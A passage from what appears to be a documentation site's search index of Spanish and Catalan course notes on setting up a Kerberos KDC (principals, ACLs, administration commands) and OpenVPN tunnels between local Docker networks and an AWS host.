kerberizados (que entienden kerberos), los usuarios presentas su tiquet, y el servidor kerberizado se comunica con el server kerberos para verificar quien es y autenticar. Ejemplo de tiquet: [ isx47787241@i09 curs ] $ klist Ticket cache: FILE:/tmp/krb5cc_101709_6EW9wO Default principal: isx47787241@INFORMATICA.ESCOLADELTREBALL.ORG Valid starting Expires Service principal 18 /02/20 08 :46:52 19 /02/20 08 :46:52 krbtgt/INFORMATICA.ESCOLADELTREBALL.ORG@INFORMATICA.ESCOLADELTREBALL.ORG 18 /02/20 08 :46:56 19 /02/20 08 :46:52 nfs/madiba.informatica.escoladeltreball.org@INFORMATICA.ESCOLADELTREBALL.ORG Auth autentication ( quien soy ) AP autentication provider: son los m\u00e9todos de autenticaci\u00f3n, es decir, verificar quien eres. Esto lo proporciona : kerberos, ldap, /etc/passwd Autz authorization ( que tengo derecho a hacer) IP information provider: Una vez sabido quien eres, que puedes hacer, se dicta a trabes de uid, gid, ... Se proporciona a trabes de: ldap, /etc/passwd Autenticaction Provider AP Kerberos propoerciona el servei de prove\u00efdor d'autenticaci\u00f3. No emmagatzema informaci\u00f3 dels comptes d'usuari com el uid, git, shell, etc. Simplement emmagatzema i gestiona els passwords dels usuaris, en entrades anomenades principals en la seva base de dades. Coneixem els seg\u00fcents AP: /etc/passwd que cont\u00e9 els password (AP) i tamb\u00e9 la informaci\u00f3 dels comptes d'usuari (IP). ldap el servei de directori ldap cont\u00e9 informaci\u00f3 dels comptes d'usuari (IP) i tamb\u00e9 els seus passwords (AP). kerberos que \u00fanicament actua de AP i no de IP. Information Provider IP Els serveis que emmagatzemen la informaci\u00f3 dels comptes d'usuari s'anomenen Information providers. Aquests serveis proporcionen el uid, gid, shell, gecos, etc. Els cl\u00e0ssics s\u00f3n /etc/passwd i ldap. Kerberos utiliza tres servicios: 88 /tcp open kerberos-sec 464 /tcp open kpasswd5 749 /tcp open kerberos-adm kadmind : demonio del servicio de administraci\u00f3n kerberos krb5kdc : demonio de kerberos encargado de distribuir tiquets.","title":"Kerberos"},{"location":"seguridad/Kerberos/#instalacion-del-server","text":"","title":"Instalaci\u00f3n del server"},{"location":"seguridad/Kerberos/#instalar-paquetes","text":"dnf -y install krb5-server krb5-workstation # tree /var/kerberos/ /var/kerberos/ \u251c\u2500\u2500 krb5 \u2502 \u2514\u2500\u2500 user \u2514\u2500\u2500 krb5kdc \u251c\u2500\u2500 kadm5.acl \u2514\u2500\u2500 kdc.conf","title":"instalar paquetes"},{"location":"seguridad/Kerberos/#configurar","text":"Modificar el fichero de configuraci\u00f3n principal /etc/krb5.conf a\u00f1adir nuestro dominio ( realm ) y especificar el servidor includedir /etc/krb5.conf.d/ [ logging ] default = FILE:/var/log/krb5libs.log kdc = FILE:/var/log/krb5kdc.log admin_server = FILE:/var/log/kadmind.log [ libdefaults ] dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false default_realm = EDT.ORG # default_ccache_name = KEYRING:persistent:%{uid} [ realms ] EDT.ORG = { # servidor kerberos kdc = kserver.edt.org admin_server = kserver.edt.org } [ domain_realm ] .edt.org = EDT.ORG edt.org = EDT.ORG Poner el REALM en el archivo /var/kerberos/krb5kdc/kdc.conf [ kdcdefaults ] kdc_ports = 88 kdc_tcp_ports = 88 [ realms ] EDT.ORG = { #master_key_type = aes256-cts acl_file = /var/kerberos/krb5kdc/kadm5.acl dict_file = /usr/share/dict/words admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab supported_enctypes = aes256-cts:normal aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal }","title":"configurar"},{"location":"seguridad/Kerberos/#crear-base-de-datos","text":"Crear la base de datos que almacena claves principales ( usuarios y maquinas ) kdb5_util create -s -P masterkey # verificar que se a creado tree /var/kerberos/ /var/kerberos/ \u251c\u2500\u2500 krb5 \u2502 \u2514\u2500\u2500 user \u2514\u2500\u2500 krb5kdc \u251c\u2500\u2500 kadm5.acl \u251c\u2500\u2500 kdc.conf \u251c\u2500\u2500 principal \u251c\u2500\u2500 principal.kadm5 \u251c\u2500\u2500 principal.kadm5.lock \u2514\u2500\u2500 principal.ok","title":"Crear base de datos"},{"location":"seguridad/Kerberos/#definir-acls","text":"Definir las acl de los usuarios principales en /var/kerberos/krb5kdc/kadm5.acl */admin@EDT.ORG * superuser@EDT.ORG * pau/admin@EDT.ORG * marta@EDT.ORG *","title":"definir acl's"},{"location":"seguridad/Kerberos/#anadir-usuarios","text":"crear usuarios principales kadmin.local -q \"addprinc -pw superuser superuser\" kadmin.local -q \"addprinc -pw admin admin\" kadmin.local -q \"addprinc -pw kpere pere\" kadmin.local -q \"addprinc -pw kmarta marta\" kadmin.local -q \"addprinc -pw kjordi jordi\" kadmin.local -q \"addprinc -pw kpau pau\" kadmin.local -q \"addprinc -pw kpau pau/admin\" [ root@kserver / ] # kadmin.local -q \"list_principals\" Authenticating as principal root/admin@EDT.ORG with password. K/M@EDT.ORG admin@EDT.ORG jordi@EDT.ORG kadmin/admin@EDT.ORG kadmin/changepw@EDT.ORG kadmin/kserver@EDT.ORG kiprop/kserver@EDT.ORG krbtgt/EDT.ORG@EDT.ORG marta@EDT.ORG pau/admin@EDT.ORG pau@EDT.ORG pere@EDT.ORG superuser@EDT.ORG","title":"a\u00f1adir usuarios"},{"location":"seguridad/Kerberos/#arrancar-servicio","text":"systemctl start bkrb5kdc.service systemctl start kadmin.service /usr/sbin/krb5kdc /usr/sbin/kadmind -nofork","title":"Arrancar servicio"},{"location":"seguridad/Kerberos/#instalacion-cliente","text":"[ root@kclient / ] # dnf install -y krb5-workstation Configuraci\u00f3n [ root@khost / ] # vi /etc/krb5.conf includedir /etc/krb5.conf.d/ [ logging ] default = FILE:/var/log/krb5libs.log kdc = FILE:/var/log/krb5kdc.log admin_server = FILE:/var/log/kadmind.log [ libdefaults ] dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false default_realm = EDT.ORG # default_ccache_name = KEYRING:persistent:%{uid} [ realms ] EDT.ORG = { # servidor kerberos kdc = kserver.edt.org admin_server = kserver.edt.org } [ domain_realm ] .edt.org = EDT.ORG edt.org = EDT.ORG Comprobar [ root@khost / ] # kinit marta Password for marta@EDT.ORG: [ root@khost / ] # klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: marta@EDT.ORG Valid starting Expires Service principal 02 /18/20 18 :52:27 02 /19/20 18 :52:27 krbtgt/EDT.ORG@EDT.ORG","title":"Instalaci\u00f3n cliente"},{"location":"seguridad/Kerberos/#gestion-de-acl","text":"Definir las acl de los usuarios principales en /var/kerberos/krb5kdc/kadm5.acl El orden de las entradas es significativo. La primera entrada coincidente especifica el principal en el que se aplica el acceso de control, ya sea solo en el principal o en el principal cuando opera en un principal objetivo. Las l\u00edneas que contienen entradas de ACL deben tener el siguiente formato: principal operation-mask [ operation-target ] Operation mask : Permisos sobre que se podr\u00e1 hacer, si la opci\u00f3n est\u00e1 en may\u00fascula se denegar\u00e1 la acci\u00f3n, en min\u00fascula se aprueba, es decir a permite crear principales, A deniega crear principales. Con la excepci\u00f3n de x que no tiene versi\u00f3n may\u00fascula. a permite crear principals y politicas c permite cambio de contrase\u00f1as a principals d permite eliminar principals y politicas i permite consultas sobre principals y politicas l permite listar principals y politicas m permite modificar principals y politicas p permite la propagaci\u00f3n de la base de datos principal (utilizada en la propagaci\u00f3n de base de datos incremental) s permite la configuraci\u00f3n expl\u00edcita de la clave para un principal x Corto para admcil. Todos los privilegios * Igual que x. Operation target : opcional, objeto sobre el cual podr\u00e1 aplicar los permisos indicados, si no se indica ninguno es a todos. Ejemplos: # el usuario kser01/admin tiene permido de: add,delete, modifi. sobre todos los usuarios kuser01/admin@realm adm # el usuario kuser01 tiene permisos sobre todos los usuarios del grupo instance de: cambiar contrase\u00f1a, modificar y ver datos de usuario kuser01@EDT.ORG cim */instance@EDT.ORG # si hay un mach solo se aplica la primea regla, kuser01 solo puede cambiar contrase\u00f1as kuser01@EDT.ORG c kuser01@EDT.ORG * # kuser01 puede camiar contrase\u00f1a solo a kuser05 kuser01@EDT.ORG c kuser05@EDT.ORG # todos los usuarios pueden cambiarse la contrase\u00f1a a si mismos, no a los demas. *@EDT.ORG c self@EDT.ORG # \u00bf? sms@ATHENA.MIT.EDU x * -maxlife 9h -postdateable # kuser01 puede a\u00f1adir usuarios pero no borrarlos kuser01@EDT.ORG aD # todos los usuarios pueden cambiarse la contrase\u00f1a y kuser01 ademas puede listar y ver usuarios. *@EDT.ORG c self@EDT.ORG kuser01@EDT.ORG li","title":"Gesti\u00f3n de acl"},{"location":"seguridad/Kerberos/#gestion-del-servidor","text":"Para gestionar el servidor kerberos se tiene las siguientes herramientas. kadmin.local utilidad de administraci\u00f3n de la base de datos de principals, esta utilidad accede a bajo nivel modifica los ficheros directamente. solo se puede utilizar directamente desde el servidor y con privilegios de root. kadmin utilidad de administraci\u00f3n que conecta con el servidor por red usando el protocolo kerberos. Se puede utilizar desde cualquier cliente o servidor y establece una conexi\u00f3n de red segura. Los permisos de ACL's establecidos determina los privilegios de cada usuario. Desde host: kinit kuser06 # pedir tiquet klist # listar tiquet kpasswd # cambiar password Password for kuser06@EDT.ORG: Enter new password: Enter it again: Password changed. kdestroy # eliminar tiquet Desde server: # a\u00f1adir principal kadmin.local -q \"addprinc superuser\" kadmin.local -q \"addprinc -pw contrasena kuser03\" kadmin: addprinc pau # listar principals kadmin.local -q \"listprincs\" kadmin: listprincs # ver principal kadmin: getprinc kuser06 kadmin.local -q \"getprinc kuser06\" # cabiar contrase\u00f1a kadmin.local -q \"change_password kuser02\" kadmin.local -q \"cpw kuser02\" # eliminar principal kadmin.local -q \"delprinc kuser02\" # modificar principal kadmin: modprinc -expire \"12/31 7pm\" kuser01 https://docs.oracle.com/cd/E19683-01/816-0211/6m6nc66tj/index.html addprinc -randkey host/sshd.edt.org ktadd -k /etc/krb5.keytab host/sshd.edt.org docker exec kserver.edt.org kadmin -p marta -w kmarta -q listprincs docker system prune","title":"Gesti\u00f3n del servidor"},{"location":"seguridad/OpenVpn/","text":"OpenVpn puerto 1194 /usr/lib/systemd/system/openvpn@.service /usr/lib/tmpfiles.d/openvpn.conf ... /usr/share/doc/openvpn/sample/sample-keys [ jorge@pc03 ~ ] $ tree /etc/openvpn/ \u279c ~ ll /usr/share/doc/openvpn/examples/sample-keys total 84K -rw-r--r-- 1 root root 2 ,2K feb 20 2019 ca.crt -rw-r--r-- 1 root root 3 ,3K feb 20 2019 client.crt.gz -rw-r--r-- 1 root root 1 ,7K feb 20 2019 client.key -rw-r--r-- 1 root root 424 feb 20 2019 dh2048.pem -rw-r--r-- 1 root root 3 ,5K feb 20 2019 server.crt.gz -rw-r--r-- 1 root root 1 ,7K feb 20 2019 server.key ... \u279c ~ ll /usr/share/doc/openvpn/examples/sample-config-files total 68K -rw-r--r-- 1 root root 3 ,6K feb 20 2019 client.conf -rw-r--r-- 1 root root 4 ,3K feb 20 2019 server.conf.gz ... Ejemplos Comand line t\u00fanel simple sin cifrar. \u279c ~ sudo openvpn --remote portatil --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --verb 9 [ jorge@pc03 ~ ] $ sudo openvpn --remote torre --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --verb 9 13 : tun1: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .4.0.1 peer 10 .4.0.2/32 scope global tun1 valid_lft forever preferred_lft forever inet6 fe80::591a:b249:b1bf:89d8/64 scope link stable-privacy valid_lft forever preferred_lft forever [ jorge@pc03 ~ ] $ curl 10 .4.0.2:13 23 MAR 2020 09 :07:36 UTC t\u00fanel host a host clave compertida \u279c ~ sudo openvpn --genkey --secret key \u279c ~ sudo scp key jorge@portatil: [ jorge@pc03 ~ ] $ ls -l key -rw-------. 1 jorge jorge 636 mar 23 10 :25 key \u279c ~ sudo openvpn --remote portatil --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --verb 5 --secret key [ jorge@pc03 ~ ] $ sudo openvpn --remote torre --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --verb 5 --secret key [ jorge@pc03 ~ ] $ curl 10 .4.0.2:13 23 MAR 2020 09 :26:57 UTC host to host tls public/secret key En este casi se utiliza el host torre de server y el host portatil de cliente, las claves utilizadas son las proporcionadas por openvpn de ejemplo, nunca utilizarlas en producci\u00f3n. \u279c ~ cd /usr/share/doc/openvpn/examples/sample-keys/ \u279c ~ sudo cp dh2048.pem ca.crt client.key client.crt.gz server.crt.gz server.key /home/debian/ \u279c ~ scp ca.crt client.* jorge@portatil: \u279c ~ sudo openvpn --remote portatil --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --verb 5 --tls-server --dh dh2048.pem --ca ca.crt --cert server.crt --key server.key --reneg-sec 60 --verb 5 [ jorge@pc03 ~ ] $ sudo openvpn --remote torre --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --tls-client --ca ca.crt --cert client.crt --key client.key --reneg-sec 60 --verb 5 [ jorge@pc03 ~ ] $ curl 10 .4.0.2:13 23 MAR 2020 09 :56:29 UTC t\u00fanel network to network b\u00e1sicamente es enrrutar la subred creada por un tunel a un gateway externo may \u279c ~ sudo echo 1 | tee /proc/sys/net/ipv4/ip_forward june \u279c ~ sudo echo 1 | tee /proc/sys/net/ipv4/ip_forward may \u279c ~ iptables \u2212A FORWARD \u2212i tun+ \u2212j ACCEPT june \u279c ~ iptables \u2212A FORWARD \u2212i tun+ \u2212j ACCEPT may \u279c ~ route add \u2212net 10 .0.1.0 netmask 255 .255.255.0 gw 10 .4.0.2 june \u279c ~ route add \u2212net 10 .0.0.0 netmask 255 .255.255.0 gw 10 .4.0.1 Esquema: may june 10.4.0.1 route adds 10.4.0.2 +-----+ <-----------+ +----+ | | | | +-----+ +----------> v----+ || | | || | | || OpenS 10.0.1.1 | | OpenS 10.0.0.1 || tunel | | tunel || OpenC 10.0.1.2 | | OpenC 10.0.0.2 +-----+ +----+ | | | | +-----+ +----+ Server multiuser Configuraci\u00f3n para un servidor, que puede albergar m\u00faltiples usuarios con las mismas llaves. Dominio El dominio que trae por defecto lo modifico a mi gusto, para simplificar su utilizaci\u00f3n. [ fedora@aws ~ ] $ sudo cp /lib/systemd/system/openvpn-server@.service /etc/systemd/system/. [ fedora@aws ~ ] $ cat /etc/systemd/system/openvpn-server@.service [ Unit ] Description = OpenVPN service for %I hisx After = syslog.target network-online.target [ Service ] Type = forking PrivateTmp = true ExecStartPre = /usr/bin/echo serveri %i %I PIDFile = /var/run/openvpn-server/%i.pid ExecStart = /usr/sbin/openvpn --daemon --writepid /var/run/openvpn-server/%i.pid --cd /etc/openvpn/ --config %i.conf [ Install ] WantedBy = multi-user.target Configuraci\u00f3n Configuraci\u00f3n del servidor [ fedora@aws ~ ] $ cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf . [ fedora@aws ~ ] $ sudo cp server.conf /etc/openvpn/hisxserver.conf [ fedora@aws ~ ] $ cat /etc/openvpn/hisxserver.conf port 1194 proto udp dev tun ca /etc/openvpn/keys/ca.crt cert /etc/openvpn/keys/server.crt key /etc/openvpn/keys/server.key # This file should be kept secret dh /etc/openvpn/keys/dh2048.pem server 10 .8.0.0 255 .255.255.0 ifconfig-pool-persist ipp.txt client-to-client ; duplicate-cn keepalive 10 120 cipher AES-256-CBC comp-lzo persist-key persist-tun status openvpn-status.log verb 3 explicit-exit-notify 1 llaves En este paso se tienen que generar unas claves o utilizar ( solo en entornos de pruebas ) las llaves por defecto existentes en /usr/share/doc/openvpn/sample/sample-key ( No vienen en todas las distribuciones o versiones de las mismas ) [ fedora@aws ~ ] $ tree /etc/openvpn/ /etc/openvpn/ | -- client [ error opening dir ] | -- hisxserver.conf | -- ipp.txt | -- keys | | -- ca.crt | | -- dh2048.pem | | -- server.crt | ` -- server.key | -- openvpn-status.log ` -- server [ error opening dir ] Para acabar recargo los dominios, ya que lo hemos modificado manualmente y enciendo el server. [ fedora@aws ~ ] $ sudo systemctl daemon-reload [ fedora@aws ~ ] $ sudo systemctl start openvpn-server@hisxserver.service Compruebo que se a creado una nueva interfaz con la red indicada en el dispositivo tun0 [ fedora@ip-172-31-82-34 ~ ] $ ip a s tun0 3 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.1 peer 10 .8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::20c:58c8:3152:2900/64 scope link stable-privacy valid_lft forever preferred_lft forever Host cliente Configuraci\u00f3n Copio y modifico la configuraci\u00f3n de ejemplo proporcionada por openvpn. \u279c ~ sudo cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/client/hisxclient.conf \u279c ~ sudo cat /etc/openvpn/client/hisxclient.conf client dev tun proto udp # remote server port remote aws 1194 resolv-retry infinite nobind persist-key persist-tun ca /etc/openvpn/keys/ca.crt cert /etc/openvpn/keys/client.crt key /etc/openvpn/keys/client.key remote-cert-tls server cipher AES-256-CBC comp-lzo verb 3 llaves Estas llaves las he extra\u00eddo del servidor ( estoy utilizando las de por defecto ), todos los clientes tendr\u00e1n las mismas. \u279c ~ sudo cp ca.crt client.crt client.key /etc/openvpn/keys \u279c ~ sudo chmod 600 /etc/openvpn/keys/* [ sudo ] password for jorge: /etc/openvpn/ \u251c\u2500\u2500 client \u2502 \u2514\u2500\u2500 hisxclient.conf \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 ca.crt \u2502 \u251c\u2500\u2500 client.crt \u2502 \u251c\u2500\u2500 client.key \u2502 \u2514\u2500\u2500 dh2048.pem \u2514\u2500\u2500 server Como es un entorno de pruebas y no tengo resoluci\u00f3n al servidor, asigno la resoluci\u00f3n en /etc/hosts manualmente. \u279c ~ cat /etc/hosts 127 .0.0.1 localhost 127 .0.1.1 localhost.localdomain localhost # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 3 .84.58.174 aws Enciendo el dominio del cliente por defecto con la configuraci\u00f3n hisxclient \u279c ~ sudo systemctl start openvpn-client@hisxclient Compruebo que conecta y crea la nueva interficie tun0 \u279c ~ ip a s tun0 10 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 link/none inet 10 .8.0.6 peer 10 .8.0.5/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::ae4:71c6:32ce:c922/64 scope link stable-privacy valid_lft forever preferred_lft forever Conectividad entre redes Teniendo el servidor y cliente en marcha, en este paso se conecta la red netB en la ami de amazon con el host local y la red netA del host local con la ami de amazon. # enciendo dockers ldap y kserver en aws con la red 'netB 172.18.0.0' [ fedora@aws ~ ] $ sudo docker run --rm --name ldap.edt.org -h ldap.edt.org --net netB -d jorgepastorr/ldapserver19:final [ fedora@aws ~ ] $ sudo docker run --rm --name kserver.edt.org -h kserver.edt.org --net netB -d jorgepastorr/k19:kserver # enciendo docker local con red 'netA 172.19.0.0' \u279c ~ docker run --rm --name nethost -h nethost --net netA -d jorgepastorr/net19:nethost # desde local enruto todo el trafico de la red 172.18.0.0/16 hacia el tunel vpn 10.8.0.6 # la red 172.18.0.0 no tiene que existir en local # 10.8.0.6 es la ip local del tunel vpn \u279c ~ sudo ip route add 172 .18.0.0/16 via 10 .8.0.6 \u279c ~ ip route show default via 192 .168.88.1 dev enp3s0 proto dhcp metric 100 10 .8.0.0/24 via 10 .8.0.5 dev tun0 10 .8.0.5 dev tun0 proto kernel scope link src 10 .8.0.6 172 .17.0.0/16 dev docker0 proto kernel scope link src 172 .17.0.1 linkdown 172 .18.0.0/16 via 10 .8.0.6 dev tun0 172 .19.0.0/16 dev br-2d7ff7224245 proto kernel scope link src 172 .19.0.1 # permito pc local enrutar y abro peticiones del tunel vpn \u279c ~ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward \u279c ~ sudo iptables -A FORWARD -i tun+ -j ACCEPT # desde aws enruto todo el trafico de la red 172.19.0.0/16 hacia el tunel vpn 10.8.0.2 # la red 172.19.0.0 no tiene que existir en aws [ fedora@aws ~ ] $ sudo ip route add 172 .19.0.0/16 via 10 .8.0.2 [ fedora@aws ~ ] $ sudo ip r default via 172 .31.80.1 dev eth0 proto dhcp metric 100 10 .8.0.0/24 via 10 .8.0.2 dev tun0 10 .8.0.2 dev tun0 proto kernel scope link src 10 .8.0.1 172 .17.0.0/16 dev docker0 proto kernel scope link src 172 .17.0.1 linkdown 172 .18.0.0/16 dev br-9202ac48a79d proto kernel scope link src 172 .18.0.1 172 .19.0.0/16 via 10 .8.0.2 dev tun0 172 .31.80.0/20 dev eth0 proto kernel scope link src 172 .31.92.8 metric 100 # permito aws enrutar y abro peticiones del tunel vpn [ fedora@aws ~ ] $ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward [ fedora@aws ~ ] $ sudo iptables -A FORWARD -i tun+ -j ACCEPT # Compuebo # desde local puedo acceder a la base de datos ldap desde el enrtamiento echo de 172.18.0.0 pasando por el tunel vpn y acabando en aws. \u279c ~ ldapsearch -x -LLL -h 172 .18.0.2:389 -b 'dc=edt,dc=org' dn # desde docker local lo mismo con kserver \u279c ~ docker run --net netA --rm -it jorgepastorr/k19:khost [ root@5b295dee370e docker ] # cat /etc/hosts 127 .0.0.1 localhost 172 .19.0.3 5b295dee370e 172 .18.0.3 kserver.edt.org kserver [ root@5b295dee370e docker ] # kinit pere Password for pere@EDT.ORG: [ root@5b295dee370e docker ] # klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: pere@EDT.ORG Valid starting Expires Service principal 03 /24/20 20 :11:30 03 /25/20 20 :11:30 krbtgt/EDT.ORG@EDT.ORG","title":"OpenVpn"},{"location":"seguridad/OpenVpn/#openvpn","text":"puerto 1194 /usr/lib/systemd/system/openvpn@.service /usr/lib/tmpfiles.d/openvpn.conf ... /usr/share/doc/openvpn/sample/sample-keys [ jorge@pc03 ~ ] $ tree /etc/openvpn/ \u279c ~ ll /usr/share/doc/openvpn/examples/sample-keys total 84K -rw-r--r-- 1 root root 2 ,2K feb 20 2019 ca.crt -rw-r--r-- 1 root root 3 ,3K feb 20 2019 client.crt.gz -rw-r--r-- 1 root root 1 ,7K feb 20 2019 client.key -rw-r--r-- 1 root root 424 feb 20 2019 dh2048.pem -rw-r--r-- 1 root root 3 ,5K feb 20 2019 server.crt.gz -rw-r--r-- 1 root root 1 ,7K feb 20 2019 server.key ... \u279c ~ ll /usr/share/doc/openvpn/examples/sample-config-files total 68K -rw-r--r-- 1 root root 3 ,6K feb 20 2019 client.conf -rw-r--r-- 1 root root 4 ,3K feb 20 2019 server.conf.gz ...","title":"OpenVpn"},{"location":"seguridad/OpenVpn/#ejemplos-comand-line","text":"","title":"Ejemplos Comand line"},{"location":"seguridad/OpenVpn/#tunel-simple-sin-cifrar","text":"\u279c ~ sudo openvpn --remote portatil --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --verb 9 [ jorge@pc03 ~ ] $ sudo openvpn --remote torre --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --verb 9 13 : tun1: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .4.0.1 peer 10 .4.0.2/32 scope global tun1 valid_lft forever preferred_lft forever inet6 fe80::591a:b249:b1bf:89d8/64 scope link stable-privacy valid_lft forever preferred_lft forever [ jorge@pc03 ~ ] $ curl 10 .4.0.2:13 23 MAR 2020 09 :07:36 UTC","title":"t\u00fanel simple sin cifrar."},{"location":"seguridad/OpenVpn/#tunel-host-a-host-clave-compertida","text":"\u279c ~ sudo openvpn --genkey --secret key \u279c ~ sudo scp key jorge@portatil: [ jorge@pc03 ~ ] $ ls -l key -rw-------. 1 jorge jorge 636 mar 23 10 :25 key \u279c ~ sudo openvpn --remote portatil --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --verb 5 --secret key [ jorge@pc03 ~ ] $ sudo openvpn --remote torre --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --verb 5 --secret key [ jorge@pc03 ~ ] $ curl 10 .4.0.2:13 23 MAR 2020 09 :26:57 UTC","title":"t\u00fanel host a host clave compertida"},{"location":"seguridad/OpenVpn/#host-to-host-tls-publicsecret-key","text":"En este casi se utiliza el host torre de server y el host portatil de cliente, las claves utilizadas son las proporcionadas por openvpn de ejemplo, nunca utilizarlas en producci\u00f3n. \u279c ~ cd /usr/share/doc/openvpn/examples/sample-keys/ \u279c ~ sudo cp dh2048.pem ca.crt client.key client.crt.gz server.crt.gz server.key /home/debian/ \u279c ~ scp ca.crt client.* jorge@portatil: \u279c ~ sudo openvpn --remote portatil --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --verb 5 --tls-server --dh dh2048.pem --ca ca.crt --cert server.crt --key server.key --reneg-sec 60 --verb 5 [ jorge@pc03 ~ ] $ sudo openvpn --remote torre --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --tls-client --ca ca.crt --cert client.crt --key client.key --reneg-sec 60 --verb 5 [ jorge@pc03 ~ ] $ curl 10 .4.0.2:13 23 MAR 2020 09 :56:29 UTC","title":"host to host tls public/secret key"},{"location":"seguridad/OpenVpn/#tunel-network-to-network","text":"b\u00e1sicamente es enrrutar la subred creada por un tunel a un gateway externo may \u279c ~ sudo echo 1 | tee /proc/sys/net/ipv4/ip_forward june \u279c ~ sudo echo 1 | tee /proc/sys/net/ipv4/ip_forward may \u279c ~ iptables \u2212A FORWARD \u2212i tun+ \u2212j ACCEPT june \u279c ~ iptables \u2212A FORWARD \u2212i tun+ \u2212j ACCEPT may \u279c ~ route add \u2212net 10 .0.1.0 netmask 255 .255.255.0 gw 10 .4.0.2 june \u279c ~ route add \u2212net 10 .0.0.0 netmask 255 .255.255.0 gw 10 .4.0.1 Esquema: may june 10.4.0.1 route adds 10.4.0.2 +-----+ <-----------+ +----+ | | | | +-----+ +----------> v----+ || | | || | | || OpenS 10.0.1.1 | | OpenS 10.0.0.1 || tunel | | tunel || OpenC 10.0.1.2 | | OpenC 10.0.0.2 +-----+ +----+ | | | | +-----+ +----+","title":"t\u00fanel network to network"},{"location":"seguridad/OpenVpn/#server-multiuser","text":"Configuraci\u00f3n para un servidor, que puede albergar m\u00faltiples usuarios con las mismas llaves.","title":"Server multiuser"},{"location":"seguridad/OpenVpn/#dominio","text":"El dominio que trae por defecto lo modifico a mi gusto, para simplificar su utilizaci\u00f3n. [ fedora@aws ~ ] $ sudo cp /lib/systemd/system/openvpn-server@.service /etc/systemd/system/. [ fedora@aws ~ ] $ cat /etc/systemd/system/openvpn-server@.service [ Unit ] Description = OpenVPN service for %I hisx After = syslog.target network-online.target [ Service ] Type = forking PrivateTmp = true ExecStartPre = /usr/bin/echo serveri %i %I PIDFile = /var/run/openvpn-server/%i.pid ExecStart = /usr/sbin/openvpn --daemon --writepid /var/run/openvpn-server/%i.pid --cd /etc/openvpn/ --config %i.conf [ Install ] WantedBy = multi-user.target","title":"Dominio"},{"location":"seguridad/OpenVpn/#configuracion","text":"Configuraci\u00f3n del servidor [ fedora@aws ~ ] $ cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf . [ fedora@aws ~ ] $ sudo cp server.conf /etc/openvpn/hisxserver.conf [ fedora@aws ~ ] $ cat /etc/openvpn/hisxserver.conf port 1194 proto udp dev tun ca /etc/openvpn/keys/ca.crt cert /etc/openvpn/keys/server.crt key /etc/openvpn/keys/server.key # This file should be kept secret dh /etc/openvpn/keys/dh2048.pem server 10 .8.0.0 255 .255.255.0 ifconfig-pool-persist ipp.txt client-to-client ; duplicate-cn keepalive 10 120 cipher AES-256-CBC comp-lzo persist-key persist-tun status openvpn-status.log verb 3 explicit-exit-notify 1","title":"Configuraci\u00f3n"},{"location":"seguridad/OpenVpn/#llaves","text":"En este paso se tienen que generar unas claves o utilizar ( solo en entornos de pruebas ) las llaves por defecto existentes en /usr/share/doc/openvpn/sample/sample-key ( No vienen en todas las distribuciones o versiones de las mismas ) [ fedora@aws ~ ] $ tree /etc/openvpn/ /etc/openvpn/ | -- client [ error opening dir ] | -- hisxserver.conf | -- ipp.txt | -- keys | | -- ca.crt | | -- dh2048.pem | | -- server.crt | ` -- server.key | -- openvpn-status.log ` -- server [ error opening dir ] Para acabar recargo los dominios, ya que lo hemos modificado manualmente y enciendo el server. [ fedora@aws ~ ] $ sudo systemctl daemon-reload [ fedora@aws ~ ] $ sudo systemctl start openvpn-server@hisxserver.service Compruebo que se a creado una nueva interfaz con la red indicada en el dispositivo tun0 [ fedora@ip-172-31-82-34 ~ ] $ ip a s tun0 3 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.1 peer 10 .8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::20c:58c8:3152:2900/64 scope link stable-privacy valid_lft forever preferred_lft forever","title":"llaves"},{"location":"seguridad/OpenVpn/#host-cliente","text":"","title":"Host cliente"},{"location":"seguridad/OpenVpn/#configuracion_1","text":"Copio y modifico la configuraci\u00f3n de ejemplo proporcionada por openvpn. \u279c ~ sudo cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/client/hisxclient.conf \u279c ~ sudo cat 